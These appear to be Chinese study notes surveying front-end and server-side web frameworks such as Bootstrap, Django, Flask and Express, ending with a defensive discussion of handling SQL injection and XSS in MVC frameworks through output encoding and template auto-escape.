Web框架安全
			
	目前主流的JavaScript框架排名中，jQuery和Ext可算是佼佼者，获得了用户的广泛好评
	国内的一些框架很多也是仿照jQuery对JavaScript进行了包装，不过这些框架的鼻祖YUI还是坚持用自己的JavaScript类库
	jQuery是目前用的最多的前端JavaScript类库，据初步统计，目前jQuery的占有率已经超过46%，它算是比较轻量级的类库，对DOM的操作也比较方便到位，支持的效果和控件也很多
	同时，基于jQuery有很多扩展项目，包括jQuery UI(jQuery支持的一些控件和效果框架)、jQuery Mobile(移动端的jQuery框架)、QUnit(JavaScript的测试框架)、Sizzle(CSS的选择引擎)
	这些补充使得jQuery框架更加完整，更令人兴奋的是，这些扩展与目前的框架基本都是兼容的，可以交叉使用，使得前端开发更加丰富
	Ext是Sencha公司推崇的JavaScript类库，相比jQuery，Ext JS更重量级，动辄数兆的文件，使得Ext在外网使用的时候会顾虑很多
	但是，另一方面，在Ext JS庞大的文件背后是Ext JS强大的功能
	Ext JS的控件和功能可以说强大和华丽到了让人发指的程度
	图表、菜单、特效，Ext JS的控件库非常丰富，同时它的交互也非常强大，独立靠Ext JS几乎就可以取代控制层完成于客户的交互
	强大的功能，丰富的控件库，华丽的效果也使得Ext JS成为内网开发利器
	框架鼻祖YUI也有自己的JavaScript类库，DOM操作和效果处理也还比较方便，功能和控件也很齐全，但是相比jQuery和Ext JS 显得比较中庸一些
	随着Yahoo!的没落，YUI的呼声也逐渐被新起的框架淹没，想来也让人惋惜

	* Bootstrap
		Boostrap绝对是目前最流行用得最广泛的一款框架
		它是一套优美，直观并且给力的web设计工具包，可以用来开发跨浏览器兼容并且美观大气的页面
		它提供了很多流行的样式简洁的UI组件，栅格系统以及一些常用的JavaScript插件
		Bootstrap是用动态语言LESS写的，主要包括四部分的内容
			* 脚手架
				全局样式，响应式的12列栅格布局系统，记住Bootstrap在默认情况下并不包括响应式布局的功能，因此，如果你的设计需要实现响应式布局，那么你需要手动开启这项功能
			* 基础CSS
				包括基础的HTML页面要素，比如表格(table)，表单(form)，按钮(button)，以及图片(image)，基础CSS为这些要素提供了优雅，一致的多种样式
			* 组件
				收集了大量可以重用的组件，如下拉菜单(dropdowns)，按钮组(button groups)，导航面板(navigation control)——包括tabs，pills，lists标签，面包屑导航(breadcrumbs)以及页码(pagination)，缩略图(thumbnails)，进度条(progress bars)，媒体对象(media objects)等等
			* JavaScript
				包括一系列jQuery的插件，这些插件可以实现组件的动态页面效果，插件主要包括模态窗口(modals)，提示效果(tool tips)，泡芙效果(popovers)，滚动监控(scrollspy)，旋转木马(carousel)，输入提示(typeahead)，等等
		Bootstrap已经足够强大，能够实现各种形式的Web界面，为了更加方便地利用Bootstrap进行开发，很多工具和资源可以用来配合使用，下面列举了其中的一部分工具和资源
			* jQuery UI Bootstrap
				对于jQuery和Bootstrap爱好者来说这是个非常好的资源，能够把Bootstrap的清爽界面组件引入到jQuery UI中
			* jQuery Mobile Bootstrap Theme
				和上面提到的jQuery UI主题类似，这是一个为jQuery mobile建立的主题
				如果你想让用Bootstrap开发的网站在手机端也可以优雅访问，那么这个资源对你来说很方便易用
			* Fuel UX
				它为Bootstrap添加了一些轻量的JavaScript控件
				Fuel UI安装，修改，更新以及优化都很简单方便
			* StyleBootstrap.info
				Bootstrap提供了自己的几种界面风格，StyleBootstrap提供了更多的配色选项，并且你可以给每个组件都应用不同的配色
			* BootSwatchr
				利用这个工具你可以立刻查看主题修改后的效果
				对于每一次变动的效果，这个应用都会生成一个唯一的URL方便你与他人分享，你也可以在任意时刻修改你的主题
			* Bootswatch
				提供大量免费的Bootstrap主题
			* Bootsnipp
				在线前端框架交互组件制作工具，是一个供给设计师和开发者的基于Bootstrap HTML/CSS/JavaScript架构的免费元素
			* LayoutIt
				通过界面拖放生成器简便快捷地创建基于Bootstrap的前端代码
				通过拖放动作将Bootstrap风格的组件加入到你的个人设计里并且可以方便地修改他们的属性，简单便捷

	* Fbootstrapp
		Fbootstrapp基于Bootstrap并且提供了跟Facebook iframe apps和设计相同的功能
		包含用于所有标准组件的基本的CSS和HTML，包括排版、表单、按钮、表格、栅格、导航等等，风格与Facebook类似

	* BootMetro
		BootMetro框架的灵感来自于Metro UI CSS，基于Bootstrap框架构建，用于创建Windows 8的Metro风格的网站
        它包括所有Bootstrap的功能，并添加了几个额外的功能，比如页面平铺，应用程序栏等等

	* Kickstrap
		Kickstrap是Bootstrap的一个变体
		它基于Bootstrap，并在它的基础上添加了许多app，主题以及附加功能
		这使得这个框架可以单独地用于构建网站，而不需要额外安装什么
		你需要做的仅仅是把它放到你的网站上，然后用就可以了
		App是一些页面加载完成之后加载运行的JavaScript和CSS打包文件
		默认加载的app有Knockout.js，Retina.js，Firebug Lite，and Updater，你也可以自行添加更多的app
		选择不同的主题可以让你的网站在众多Bootstrap构建的类似网站中显得与众不同
		附加功能是一些用来扩展Bootstrap UI库的附件，它们的语法基本相同或者相似

	* Foundation
		Foundation 是一款强大的，功能丰富的并且支持响应式布局的前端开发框架，你可以通过Foundation快速创建原型，利用它所包含的大量布局框架，元素以及最优范例快速创建在各种设备上可以正常运行的网站以及app
		Foundation在构建的时候秉承移动优先的策略，它拥有大量实用的语义化功能，并且使用Zepto类库来取代jQuery，这样可以带来更好的用户体验，并且提高运行的速度
		Foundation拥有一套12列的灵活可嵌套的网格系统，你可以用它快速创建适应多种浏览设备的布局
		它有很多的功能
		它定义了很多的样式，比如字体排版，按钮，表单，以及多种多样的导航控件
		它也提供了很多的CSS组件，例如操作面板(panels)，价格表(price tables)，进度条(progress bars)，表格(tables)以及可以适应不同设备的可伸缩视频(flex video)，与此同时，Foundation还包括了很多的JavaScript插件，如下拉菜单(dropdowns)，joyride(网站功能引导插件)，magellan(网站固定导航插件)，orbit(支持触摸的响应式图片轮播插件)，reveal(弹出框插件)，sections(强大的tab插件)以及tooltips(工具提示)等
		Foundation框架还提供了很多有用的扩展
		* 模板(Stencils)
			Foundation框架中的所有UI元素都有Omnigraffle stencils以及矢量PDF两种格式的下载，你可以用它们来方便快捷的绘制线框图和原型图
		* HTML模板
			HTML模板可以方便地用来快速创建页面布局
			你所要做的仅仅是复制得到模板代码，然后丢到页面的标签之间就好了
		* 图标字体(Icon Fonts)
			包含自定义图标的一种网页字体
		* SVG社交网络图标(Social Icons)
			一组不依赖分辨率的社交网络图标(可缩放矢量图标)
		* 响应式表格
			Foundation框架中响应式表格的实现机制是固定表格的左边第一列，然后表格的其他列可以通过滚动条拖拉进行访问
		* 关闭帆布布局(Off-Canvas Layouts)
			这些布局可以允许一些网页内容或者导航控件在移动端设备上默认隐藏，当浏览屏幕变大或者用户进行相应操作的时候这些内容再出现
			当用户进行相关操作的时候，网页内容或者导航控件将会滑动出现

	* GroundworkCSS
		GroundworkCSS 是前端框架家族里面新添的一款小清新框架
		它是基于Sass和Compass的一个高级响应式的HTML5，CSS以及JavaScript工具包，可以用于快速创建原型并且建立在各种浏览设备上可以正常工作的网站和app
		GroundworkCSS拥有一个灵活，可嵌套的流式网格系统，方便你创建任何布局
		这个框架有很多让人印象深刻的功能，比如在平板以及移动端上的网格系统，当屏幕的宽度小于768或者480像素时，页面中原本并列排版的表格列(grid column)会自动变为独立的行，而不是折叠在一起
		另一个很酷的功能是jQuery的响应式文本(ResponsiveText)插件，这个插件可以动态调整页面文字的大小以适应浏览设备的屏幕大小
		这个插件对于可伸缩的标题以及创建响应式表格的时候特别有用
		GroundworkCSS包含了大量的UI组件，如tabs、响应式数据表格导航、按钮、表单、响应式导航控件、tiles(一套替代radio按钮以及其他默认表单元素的优雅组件)、工具提示、对话框、Cycle2(一款强大的，响应式的内容滑块)以及其他很多的有用组件
		它还提供了很多矢量社交网络图标以及图标字体
		可以通过切换页面上方的导航按钮选择不同的浏览设备要来查看这款框架的效果
		通过这种方式，你可以测试在不同的浏览设备上各种组件的响应式布局情况
		GroundworkCSS的文档写的非常好，并且包含着很多的示例，为了让你更快的上手，他还提供了多种响应式的模板
		对于这款框架，唯一我可以想到的缺点就是不能自定义要下载的框架内容

	* Gumby
		Gumby是一款基于Sass和Compass的简单灵活并且稳定的前端开发框架
		它的流式-固定布局(fluid-fixed layout)可以根据桌面端以及移动设备的分辨率自动优化要呈现的网页内容
		它支持多种网格布局，包括多列混杂的嵌套模式
		Gumby提供两套PSD的模板，方便你在12列和16列的网格系统上进行设计
		Gumby提供了一个功能丰富的UI工具包，包括按钮，表单，移动端导航，tabs，跳转链接(skip links)，拨动开关(toggles and switches，可以方便快捷地切换元素的class，而不需要进行额外的js操作)，抽屉功能(drawers)，响应式图片以及retina图片等等
		为了紧跟最近的设计潮流，Gumby的UI元素中还包括了Metro风格的扁平化设计，你也可以用Pretty风格的渐变设计，或者按照你的想法糅合两种设计风格
		该框架还提供了一套出众的响应式，拥有独立分辨率的Entypo图标，你可以在自己的web项目中尽情使用
		Gumby有一个很好自定义下载选择器，你可以自行配置各个组件的颜色，并且按自己的需求方便地下载

	* HTML KickStart
		HTML Kickstart是一款可以用来方便创建任何布局的集合Html5，CSS和jQuery的工具包
		它提供了干净，符合标准以及跨浏览器兼容的代码
		这款框架提供了多种样式表，包括网格，排版，表单，按钮，表格，列表以及一些跨浏览器兼容的web组件比如JavaScript的幻灯片功能，tabs，面包屑导航，包含子菜单的菜单以及工具提示等等
		你可以使用99Lime UIKIT提供的UI组件来搭建你的产品线框图

	* IVORY
		IVORY是一款轻量，简单但是强大的前端框架，可以用于320到1200像素宽度的响应式布局
		它基于12列的响应式网格布局，包含表格，按钮，表格，分页，拨动开关，工具提示，手风琴，选项卡等网站中常用的组件和样式

	* Kube
		如果你的新项目需要一款实在的，不需要复杂的额外功能组件的，足够简单的框架，那么Kube将会是你正确的选择
		Kube是一款最小化的，支持响应式的前端框架，它没有强加的样式设计，因此给了你充分的自由来开发自己的样式表
		它提供了一些web元素的基本样式，比如网格，表单，排版，表格，按钮，导航，链接以及图片等等
		Kube框架包括一个简洁的CSS文件用于方便地创建响应式布局，还包括了两个JS文件来完成tab以及页面的按钮操作
		如果你希望得到Kube最大化的灵活性以及个性化定制，那么你可以下载开发者版本(developer version)，这个版本包括了LESS文件(包括各种变量，mixins以及模块)

	Web框架
		Web框架(Web framework)或者叫做Web应用框架(Web application framework)，是用于进行Web开发的一套软件架构
		大多数的Web框架提供了一套开发和部署网站的方式
		为Web的行为提供了一套支持支持的方法
		使用Web框架，很多的业务逻辑外的功能不需要自己再去完善，而是使用框架已有的功能就可以

		Web框架的功能
			Web框架使得在进行Web应用开发的时候，减少了工作量
			Web框架主要用于动态网络开发，动态网络主要是指现在的主要的页面，可以实现数据的交互和业务功能的完善
			使用Web框架进行Web开发的时候，在进行数据缓存、数据库访问、数据安全校验等方面，不需要自己再重新实现，而是将业务逻辑相关的代码写入框架就可以
			也就是说，通过对Web框架进行主观上的缝缝补补，就可以实现自己进行Web开发的需求了
			以PHP为例，PHP可以在apache服务器上进行Web开发，而不必使用框架
			使用PHP进行开的时候，在不适用框架的情况下，数据库连接就需要自己来实现，页面的生成和显示也是一样
			比如框架的话可以完成避免sql注入的工作，而使用PHP在不用框架的情况下，这部分要自己做
			目前Python主流的框架有Django和Flask等
			Django是一个比较重量级的框架，重量级的意思是说，Django几乎所有的功能都帮助开发者写好了，有时候如果想做一个简单的网站，并不需要太多功能，这时候使用Django的话，就比较不合适，因为在部署网站的时候会导致很多不必要的功能也部署了进来
			而Flask是一个轻量级的框架，一些核心的功能实现了，但是实现的功能并没有Django那么多，这样可以进行自己的发挥，在Flask的基础上，如果想实现更多的功能，可以很方便地加入
			Java目前的主流开发框架是ssm(spring spring-mvc和mybatis)
			相比之前的ssh(spring struts hibernate)，ssm也是比较轻量级的框架
			为了便于理解，个人创造了一个比方，如果将Web框架比作是旋律，歌词比作是业务逻辑，那么就是不同的歌曲
			旋律可能有些地方不满足人的需求，可以进行修改
			也可以在基础上增加新的旋律
			或者是将框架比作素描的结果，然后在素描的基础上进行涂色，然后就可以成为一副画了
		
		总结
			Web框架是用来进行Web应用开发的一个软件架构
			主要用于动态网络开发
			开发者在基于Web框架实现自己的业务逻辑
			Web框架实现了很多功能，为实现业务逻辑提供了一套通用方法
	
	服务器Web框架
		服务器端框架(亦称web应用框架)使编写、维护和扩展web应用更加容易
		它们提供工具和库来实现简单、常见的开发任务，包括路由处理，数据库交互，会话支持和用户验证，格式化输出(HTML，JSON，XML)，提高安全性应对网络攻击

		直接处理HTTP请求和响应
			web框架允许你编写简单语法的代码，即可生成处理这些请求和回应的代码
			这意味着你的工作变得简单、交互变得简单、并且使用抽象程度高的代码而不是底层代码
			每一个view函数(请求的处理者)接受一个包含请求信息的HttpRequest对象，并且被要求返回一个包含格式化输出的HttpResponse(在下面的例子中是一个字符串)
			------------------------------------------------------------
			# Django view function
			from django.http import HttpResponse
			def index(request):
			    # Get an HttpRequest (request)
			    # perform operations using information from the request.
			    # Return HttpResponse
			    return HttpResponse('Output string to return')
			------------------------------------------------------------
		
		将请求路由到相关的handler中
			大多数的站点会提供一系列不同资源，通过特定的URL来访问
			如果都放在一个函数里面，网站会变得很难维护
			所以web框架提供一个简单机制来匹配URL和特定处理函数
			这种方式对网站维护也有好处，因为你只需要改变用来传输特定功能的URL而不用改变任何底层代码
			不同的框架使用不同机制进行匹配
			比如Flask(Python)框架通过使用装饰器来增加视图的路由
			-------------------------
			@app.route("/")
			def hello():
			    return "Hello World!"
			-------------------------
			然而，Django则期望开发者们定义一张URL pattern和视图函数URL的匹配列表
			------------------------------------------------------------------------
			urlpatterns = [
			    url(r'^$', views.index),
			    # example: /best/myteamname/5/
			    url(r'^(?P<team_name>\w.+?)/(?P<team_number>[0-9]+)/$', views.best),
			]
			------------------------------------------------------------------------

		使从请求中获得数据变得简单
			数据在HTTP请求中的编码方式有很多种
			一个从服务器获得文件或者数据的HTTP GET请求可能会按照URL参数中要求的或者URL结构中的方式进行编码
			一个更新服务器上数据的HTTP POST请求则会在请求主体中包含像POST data这样的更新信息
			HTTP请求也可能包含客户端cookie中的即时会话和用户信息
			web框架提供一个获得这些信息的适合编程语言的机制
			比如，Django传递给视图函数的HttpRequest对象包含着获得目标URL的方式和属性、请求的类型(比如一个HTTP GET)、GET或者POST参数、cookie或者session数据等等
			Django也可以通过在URL匹配表中定义抓取模式来在URL结构中传递编码了的信息(如上面的编码片段中的最后一行)

		抽象和简化数据库接口
			网站使用数据库来存储与用户分享的信息和用户个人信息
			web框架通常会提供一个数据库层来抽象数据库的读、写、查询和删除操作
			这一个抽象层被称作对象关系映射器(ORM)
			使用对象关系映射器有两个好处
				* 你不需要改变使用数据库的代码就可以替换底层数据库
					这就允许开发者依据用途优化不同数据库的特点
				* 简单的数据的验证可以被植入到框架中
					这会使得检查数据是否按照正确的方式存储在数据库字段中或者是否是特定的格式变得简单(比如邮箱地址)，并且不是恶意的(黑客可以利用特定的编码模式来进行一些如删除数据库记录的非法操作)
			比如，Django框架提供一个对象关系映射，并且将用来定义数据库记录的结构称作模型
			模型制定被存储的字段类型，可能也会提供那些要被存储的信息的验证(比如，一个email字段只允许合法email地址)
			字段可能也会指明最大信息量、默认值、选项列表、帮助文档、表单标签等
			这个模型不会申明任何底层数据库的信息，因为这是一个只能被我们的代码改变的配置信息
			下面第一个代码片段展示了一个简单的为Team对象设计的Django模型
			这个模型会使用字符字段来存储一个队伍的名字和级别，同时还指定了用来存储每一条记录的最大字符数量
			team_level是一个枚举字段，所以我们也提供了一个被存储的数据和被展示出来的选项之间的匹配，同时指定了一个默认值
			---------------------------------------------------------------------------------
			#best/models.py

			from django.db import models
			class Team(models.Model):
			    team_name = models.CharField(max_length=40)
			    TEAM_LEVELS = (
			        ('U09', 'Under 09s'),
			        ('U10', 'Under 10s'),
			        ('U11, 'Under 11s'),
			        ...  #list our other teams
			    )
			    team_level = models.CharField(max_length=3,choices=TEAM_LEVELS,default='U11')
			---------------------------------------------------------------------------------
			Django模型提供了简单的搜索数据库的查询API
			这可以通过使用不同标准来同时匹配一系列的字段(比如精确、不区分大小写、大于等等)，并且支持一些复杂的陈述(比如，你可以指定在U11水平的队伍中搜索队伍名字中以Fr开头或者al结尾的队伍)
			第二个代码片段展示了一个视图函数(资源处理器)，这个视图函数用来展示所有U09水平的队伍——通过指明过滤出所有team_level字段能准确匹配U09的队伍(注意过滤规则如何传递给filter())，它被视为一个变量team_level__exact，由字段名、匹配类型和分隔它们的双重下划线组成
			-------------------------------------------------------------
			#best/views.py

			from django.shortcuts import render
			from .models import Team
			def youngest(request):
			    list_teams = Team.objects.filter(team_level__exact="U09")
			    context = {'youngest_teams': list_teams}
			    return render(request, 'best/index.html', context)
			-------------------------------------------------------------

		渲染数据
			web框架经常提供模板系统
			这些允许你制定输出文档的结构，使用为那些数据准备的将在页面生成时添加进去的占位符
			模板经常是用来生成HTML的，但是也可以用来生成一些其他的文档
			框架提供一个机制，使得从存储的数据中生成其他格式数据变得简单，包括JSON和XML
			比如，Django模板允许你通过使用双重花括号(如{{ variable_name }})来指定变量，当页面被渲染出来时，这些变量会被从视图函数传递过来的值代替
			模板系统也会提供表达支持(通过语法{% expression %}来实现)，这样就允许模板进行一些简单的操作比如迭代传递给模板的值列表
			下面的代码片段展示了它们如何工作的
			下面的内容接着从上一个部分而来的youngest team实例，HTML模板通过视图函数传进一个叫做youngest_teams的值列表
			在HTML骨架中我们有一个初步检查youngest_teams变量是否存在的表示，然后会在for循环里面进行迭代
			在每一次迭代中模板会以列表元素的形式展示队伍的team_name值
			---------------------------------------------
			#best/templates/best/index.html

			<!DOCTYPE html>
			<html lang="en">
				<body>
					{% if youngest_teams %}
					    <ul>
					    {% for team in youngest_teams %}
					        <li>{{ team.team_name }}</li>
					    {% endfor %}
					    </ul>
					{% else %}
					    <p>No teams are available.</p>
					{% endif %}
				</body>
			</html>
			---------------------------------------------

		如何选择一个web框架
			几乎对于你想要使用的每一种语言都有大量的web框架(我们在下面的部分列举了一些比较受欢迎的框架)
			有这么多选择，导致很难决定选择哪个框架为你的新web应用提供最好的开端
			一些影响你决定的因素有
				学习代价
					学习一个web框架取决于你对底层语言的熟悉程度，它的API的一致性与否，文档质量，社区的体量和活跃程度
					如果你完全没有编程基础的话，那就考虑Django吧(它是基于上面几条标准来看最容易学习的了)
					如果你已经成为开发团队的一部分，而那个开发团队对某一种语言或者某一个框架有着很重要的开发经历，那么就坚持相关框架
				效率
					效率是指一旦你熟悉某一个框架之后，你能够多块地创造一个新功能的衡量方式，包括编写和维护代码的代价(因为当前面的功能崩掉之后，你没法编写新的功能)
					影响效率的大多数因素和学习代价是类似的比如，文档，社区，编程经历等等
					其他因素还有
						框架目的/起源
							一些框架最初是用来解决某一类特定问题的，并且最好在生成app的时候顾及到这些约束
							比如，Django是用来支持新闻网站的，因此非常适合博客或者其他包含发布内容的网站
							相反的，Flask是一个相对来说轻量级的框架，因此适合用来生成一些在嵌入式设备上运行的app
						Opinionated vs unopinionated
							一个opinionated的框架是说，解决某一个特定问题时，总有一个被推荐的最佳的解决方法
							opinionated的框架在你试图解决一些普通问题的时候，更加趋向于产品化，因为它们会将你引入正确的方向，尽管有些时候并不那么灵活
							一些web框架默认地包含了开发者们能遇到的任何一个问题的工具/库，而一些轻量级的框架希望开发者们自己从分离的库中选择合适的解决方式
							Django是其前者的一个实例，而(Flask则是轻量级的一个实例)包含了所有东西的框架通常很容易上手因为你已经有了你所需要的任何东西，并且很可能它已经被整合好了，并且文档也写得很完善
							然而一个较小型的框架含有你所需要(或者以后需要)的各种东西，它将只能在受更多限制的环境中运行，并且需要学习更小的、更简单的子集学习
						是否选择一个鼓励良好开发实例的框架
							比如，一个鼓励Model-View-Controller结构来将代码分离到逻辑函数上的框架将会是更加易于维护的代码，想比与那些对开发者没有此期待的框架而言
							同样的，框架设计也深刻影响了测试和重复使用代码的难易程度
				框架/编程语言的表现
					通常来讲，速度并不是选择中最重要的因素，甚至，相对而言，运行速度很缓慢的Python对于一个在中等硬盘上跑的中等大小的网站已经足够了
					其他语言(C++/Javascript)的明显的速度优势很有可能被学习和维护的代价给抵消了
				缓存支持
					当你的网站之间变得越来越成功之后，你可能会发现它已经无法妥善处理它收到的大量请求了
					在这个时候，你可能会开始考虑添加缓存支持
					缓存是一种优化，是指你将全部的或者大部分的网站请求保存起来，那么在后继请求中就不需要重新计算了
					返回一个缓存请求比重新计算一次要快得多
					缓存可以被植入你的代码里面，或者是服务器中参见(reverse proxy)
					web框架对于定义可缓存内容有着不同程度的支持
				可扩展性
					一旦你的网站非常成功的时候，你会发现缓存的好处已经所剩无几了，甚至垂直容量到达了极限(将程序运行在更加有力的硬件上面)
					在这个时候，你可能需要水平扩展(将你的网站分散到好几个服务器和数据库上来加载)或者地理上地扩展，因为你的一些客户距离你的服务器很远
					你所选择的框架将会影响到扩展你的网站的难易程度
				网络安全
					一些web框架对于解决常见的网络攻击提供更好的支持
					例如，Django消除所有用户从HTML输入的东西
					因此从用户端输入的Javascript不会被运行
					其他框架也提供相似的功能，但是通常在默认情况下是不直接开启的
			可能还有其他一些原因，包括许可证、框架是否处于动态发展过程中等等
			如果你是一个完全的初学者，那么你可能会基于易于学习来选择你的框架
			除了语言本身的易于学习之外，帮助新手的高质量的文档/教程和一个活跃的社区是你最有价值的资源
			在后续课程中，我们选取了Djnago(Python)和Express(Node/Javascript)来编写我们的实例，主要因为它们很容易上手并且有强大的支持

		几个还不错的框架
			下面的服务器端框架体现了现在最受欢迎的几个
			它们有你需要用来提升效率的一切东西——它们是开源的，一直保持发展的态势，有着富有激情的社区，社区里的人创作出文档并且在讨论板上帮助使用者，并且被使用在很多高质量的网站上
			当然还有很多其他非常棒的框架，你可以使用搜索引擎探索一下

			Django(Python)
				Django是一个高水平的python web框架，它鼓励快速的开发和简洁、务实的设计
				它由非常有经验的开发者创建的，考虑到了web开发中会遇到的大多数难题，所以你无需重复造轮就能够专心编写你的应用
				Django遵循Batteries included哲学，并且提供了几乎所有大多开发者们想要开箱即用的东西
				因为它已经包含了所有东西，它作为一个整体一起工作，遵循着一致的设计原则，并且有扩展的、持续更新的文档
				它也是非常快、安全和易于扩展的
				基于python，Django代码非常容易阅读和维护
				使用Django的主流网站(从Django官网首页看到的)包括
					* Disqus
					* Instagram
					* Knight Foundation
					* MacArthur Foundation
					* Mozilla
					* National Geographic
					* Open Knowledge Foundation
					* Pinterest
					* Open Stack

			Flask(Python)
				Flask是python的一个微型框架
				虽然体量很小，Flask却可以开箱即用地创造出完备网站
				它包含一个开发服务器和调试器，并且包含对于Jinja2模板的支持, 安全的cookie，unit testing，和RESTful request dispatching
				它有很好的文档和一个活跃的社区
				Flask已经非常火爆了，部分因为那些需要在小型的、资源受限的系统中提供web服务的开发者们(比如，在Raspberry Pi，Drone controllers等上面运行服务器)
			
			Express(Node.js/JavaScript)
				Express针对Node.js的快速的、unopinioned、灵活的、小型的web框架(node是用来运行Javascript的无浏览器的环境)
				它为web和移动应用提供强大的系列功能，并且传输有用的HTTP工具、方法和middleware
				Express非常受欢迎，主要因为它减轻了客户端Javascript程序到服务器端开发的迁移，并且部分因为它是资源节约型(底层的node环境在单线程中使用轻量级多任务处理，而不是为每个web请求提供单独的进程)
				因为Express是一个小型的web框架，它几乎不包含任何你可能想要使用的组件(比如，数据库接口和对用户和会话的支持通过独立的库来完成)
				有很多独立的、非常好的组件，但是有时候你可能很难决定对于特定目的而言哪一个是最好的
				很多非常受欢迎的服务器端编程和全栈框架(同时包括服务器端和客户端框架)，包括 Feathers，ItemsAPI，KeystoneJS，Kraken，LEAN-STACK，LoopBack，MEAN，和Sails
				大量的profile company使用Express，包括优步、Accenture、IBM等

			Ruby on Rails(Ruby)
				Rails(通常被称作Ruby on Rails)是一个为Ruby语言编写的web框架
				Rails遵循了和Django非常相似的设计哲学
				正如Django一样，它提供了检索URLs的标准机制、从数据库中访问数据、从模板中生成HTML页面、格式化数据JSON或者XML
				同样的，它也鼓励如DRY(不要重复你自己)的设计模板——尽可能地只写一次代码、MVC(模板-视图-控制中心)以及很多其他的一些
				当然，还有很多由于因为具体设计决定和语言的特性导致的差异
				Rails被用在很多站点中，包括
					* Basecamp
					* GitHub
					* Shopify
					* Airbnb
					* Twitch
					* SoundCloud
					* Hulu
					* Zendesk
					* Square
					* Hi
			
			ASP.NET
				ASP.NET是一个由微软开发的开源Web框架，用于构建现代的Web应用程序和服务
				通过ASP.NET你能快速创建基于HTML、CSS、JavaScript的网站，并且能满足大量用户的需求，还可以很容易地添加诸如Web API、数据表单、即时通讯的功能
				ASP.NET的特点之一就是它建立在Common Language Runtime(CLR公共语言运行时)之上
				这使得程序员可以使用任何支持的.NET语言(如C#、Visual Basic)来编写ASP.NET代码
				和很多微软的产品一样，它得益于出色的开发工具(通常是免费的)、活跃的开发者社区，以及详尽的文档
				ASP.NET被微软、Xbox、Stack Overflow等采用

			Mojolicious(Perl)

	MVC框架安全
		实施安全方案，要达到好的效果，必须要完成两个目标
			* 安全方案正确、可靠
			* 能够发现所有可能存在的安全问题，不出现遗漏
		只有深入理解漏洞原理之后，才能设计出真正有效、能够解决问题的方案，本书的许多篇幅，都是介绍漏洞形成的根本原因
		比如真正理解了XSS、SQL注入等漏洞的产生原理后，想彻底解决这些顽疾并不难
		但是，方案光有效是不够的，要想设计出完美的方案，还需要解决第二件事情，就是找到一个方法，能够让我们快速有效、不会遗漏地发现所有问题
		而Web开发框架，为我们解决这个问题提供了便捷
		在现代Web开发中，使用MVC架构是一种流行的做法
		MVC是Modd-View-Controller的缩写，它将Web应用分为三层，View层负责用户视图、页面展示等工作，Controller负责应用的逻辑实现，接收View层传入的用户请求，并转发给对应的Model做处理，Model层则负责实现模型，完成数据的处
		从数据的流入来看，用户提交的数据先后流经了View层、Controller、Model层，数据的流出则反过来，在设计安全方案时，要牢牢把握住数据这个关键因素
		在MVC框架中，通过切片、过滤器等方式，往往能对数据进行全局处理，这为设计安全方案提供了极大的便利
		比如在Spring Security中，通过URL pattern实现的访问控制，需要由框架来处理所有用户请求，在Spring Security获取了URL handler基础上，才有可能将后续的安全检查落实，在Spring Security的配置中，第一步就是在web.xml文件中增加一个filter，接管用户数据				
		然而数据的处理是复杂的，数据经过不同的应用逻辑处理后，其内容可能会发生改变
		比如数据经过toLowercase，会把大写变成小写，而一些编码解码，则可能会把GBK变成Unicode码
		这些处理都会改变数据的内容，因此在设计安全方案时，要考虑到数据可能的变化，认真斟酌安全检查插入的时机
		*注入攻击* 我们并没有使用PHP的magic_quotes_gpc作为一项对抗SQL注入的防御方案，这是因为magic_quotes_gpc是有缺陷的，它并没有在正确的地方解决问题
		magic_quotes_gpc实际上是调用了一次addslashes()，将一些特殊符号(比如单引号)进行转义，变成了\'
		对应到MVC架构里，它是在View层做这件事情的，而SQL注入是Model层需要解决的问题，结果如何呢
		黑客们找到了多种绕过magic_quotes_gpc的办法，比如使用GBK编码、使用无单引号的注入等
		PHP官方在若干年后终于开始正视这个问题，于是在官方文档的描述中不再推荐大家使用它
			http://php.net/manual/en/security.magicquotes.php
		一般来说，我们需要先想清楚要解决什么问题，深入理解这些问题后，再在正确的地方对数据进行安全检查
		一些主要的Web安全威胁，如XSS、CSRF、SQL注入、访问控制、认证、URL跳转等不涉及业务逻辑的安全问题，都可以集中放在MVC框架中解决
		在框架中实施安全方案，比由程序员在业务中修复一个个具体的bug，有着更多的优势
		* 有些安全问题可以在框架中统一解决，能够大大节省程序员的工作量，节约人力成本
		 	当代码的规模大到一定程度时，在业务的压力下，专门花时间去一个个修补漏洞几乎成为不可能完成的任务
		* 对于一些常见的漏洞来说，由程序员一个个修补可能会出现遗漏，而在框架中统一解决，有可能解决遗漏的问题
			这需要制定相关的代码规范和工具配合
		* 在每个业务里修补安全漏洞，补丁的标准难以统一，而在框架中集中实施的安全方案，可以使所有基于框架开发的业务都能受益，从安全方案的有效性来说，更容易把握

	模版引擎与XSS防御
		在View层，可以解决XSS问题
		*跨站脚本攻击(XSS)* ，阐述了输入检查与输出编码这两种方法在XSS防御效果上的差异
		XSS攻击是在用户的浏览器上执行的，其形成过程则是在服务器端页面渲染时，注入了恶意的HTML代码导致的
		从MVC架构来说，是发生在View层，因此使用输出编码的防御方法更加合理，这意味着需要针对不同上下文的XSS攻击场景，使用不同的编码方式
		我们将输出编码的防御方法总结为以下几种
			* 在HTML标签中输出变量
			* 在HTML属性中输出变量
			* 在script标签中输出变量
			* 在事件中输出变量
			* 在CSS中输出变量
			* 在URL中输出变量
		针对不同的情况，使用不同的编码函数
		那么现在流行的MVC框架是否符合这样的设计呢?答案是否定的
		在当前流行的MVC框架中，View层常用的技术是使用模板引擎对页面进行渲染，比如 * 第三章 跨站脚本攻击(XSS)* 所提到的Django，就使用了Django Templates作为模板引擎
		模板引擎本身，可能会提供一些编码方法
		为了方便，很多程序员可能会选择关闭auto-escape
		要检查auto-escape是否被关闭也很简单，搜索代码里是否出现上面两种情况即可
		但是正如前文所述，最好的XSS防御方案，在不同的场景需要使用不同的编码函数，如果统一使用这5个字符的HtmlEncode，则很可能会被攻击者绕过
		由此看来，这种auto-escape的方案，看起来也变得不那么美好了 *跨站脚本攻击(XSS)*
		再看看非常流行的模板引擎Velocity，它也提供了类似的机制，但是有所不同的是，Velocity默认是没有开启HtmlEncode的
		但Velocity提供的处理机制，与Django的auto-escape所提供的机制是类似的，都只进行了HtmlEncode，而未细分编码使用的具体场景
		不过幸运的是，在模板引擎中，可以实现自定义的编码函数，应用于不同场景
		在Django中是使用自定义filters，在Velocity中则可以使用宏(velocimacro)
		通过自定义的方法，使得XSS防御的功能得到完善，同时在模板系统中，搜索不安全的变量也有了依据，甚至在代码检测工具中，可以自动判断出需要使用哪一种安全的编码方法，这在安全开发流程中是非常重要的
